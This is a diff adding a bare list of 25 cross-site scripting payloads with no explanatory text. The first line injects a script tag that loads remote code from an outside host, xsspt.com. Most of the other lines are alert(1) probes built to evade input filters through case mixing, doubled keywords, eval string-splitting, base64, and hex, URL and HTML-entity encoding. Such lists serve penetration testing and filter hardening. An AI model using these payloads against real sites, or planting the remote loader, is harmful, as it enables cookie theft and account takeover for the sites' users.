@@ -1,0 +1,25 @@
+<script src=https://xsspt.com/VBAhTu></script>
+<a href=javascript:alert(1)>xss</a>
+<svg onload=alert(1)>
+<img src=1 onerror=alert(1)>
+<img src=https://www.baidu.com/img/bd_logo1.png onload=alert(1)>
+<details open ontoggle=alert(1)>
+<body onload=alert(1)>
+<M onmouseover=alert(1)>M
+<iframe src=javascript:alert(1)></iframe>
+<iframe onload=alert(1)>
+<input type="submit" onfocus=alert(1)>
+<input type="submit" onclick=alert(1)>
+<form><input type="submit" formaction=javascript:alert(1)>
+<img/src="1"/onerror=alert(1)>
+<iimgmg src=1 oonerrornerror=aimglert(1)>
+<iMg src=1 oNerRor=alert(1)>
+<img src=1 onerror="a=`aler`;b=`t(1)`;eval(a+b);">
+<img src=1 onerror=eval(atob('YWxlcnQoMSk='))>
+<img src=1 onerror=location='javascript:%61%6C%65%72%74%28%31%29'>
+<img src=1 onerror=location='javascript:\x61\x6C\x65\x72\x74\x28\x31\x29'>
+<img src=1 onerror=location="javascr"+"ipt:"+"%61%6C%65%72%74%28%31%29">
+<img src=1 onerror="window.onerror=eval;throw'=alert\x281\x29';">
+<img src=1 onerror     =alert(1)>
+<img src=1 onerror=&#x0061;&#x006c;&#x0065;&#x0072;&#x0074;&#x0028;&#x0031;&#x0029;>
+<img src=1 onerror=&#x00000061;&#x006c;&#x0065;&#x0072;&#x0074;&#x0028;&#x0031;&#x0029;>
